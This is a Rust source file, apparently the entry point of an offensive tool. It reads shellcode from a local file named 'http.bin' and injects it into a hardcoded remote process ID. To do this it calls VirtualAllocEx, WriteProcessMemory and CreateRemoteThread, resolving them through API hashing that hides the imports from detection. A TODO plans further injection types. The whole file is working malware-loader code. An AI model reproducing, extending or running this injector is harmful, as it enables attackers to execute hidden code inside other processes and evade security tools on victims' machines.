#![allow(warnings)]
use std::collections::HashMap;
mod types;
mod utils;
mod helpers;
mod injection;

/*
TODO
1. Remove process ID hardcoding
2. Add other types of injections
*/

fn main() {
    // Process ID for remote injection
    let pid_to_inject = 2772;

    // Define hashes for library and functions that will be used
    let lib_hash: u32 = 4247443901; //KERNEL32.DLL
    let api_hashes: HashMap<&str, u32> = HashMap::from([
        ("vae", 2908147326),  // VirtualAllocEx
        ("vpe", 3888478527),  // VirtualProtectEx
        ("wpm", 4252799543),  // WriteProcessMemory
        ("crt", 256709555),   // CreateRemoteThread
        ("op", 2936230014),   // OpenProcess
        ("ch", 2656327410),   // CloseHandle
    ]);

    // Get the addresses of all functions that will be used
    let apis: HashMap<&str, types::LPVOID> = utils::initAPIs(lib_hash, api_hashes);

    let file_path: &str = "C:\\Users\\nullb1t3\\Desktop\\http.bin";
    println!("[+] Reading shellcode from a file: {}", file_path);

    // The shellcode is read as a byte vector
    let shellcode: Vec<u8> = match utils::read_file(file_path) {
        Some(sc) => sc,
        None => {
            return
        }
    };

    // Inject the shellcode
    injection::remote_inject(apis, shellcode, pid_to_inject as types::DWORD);
}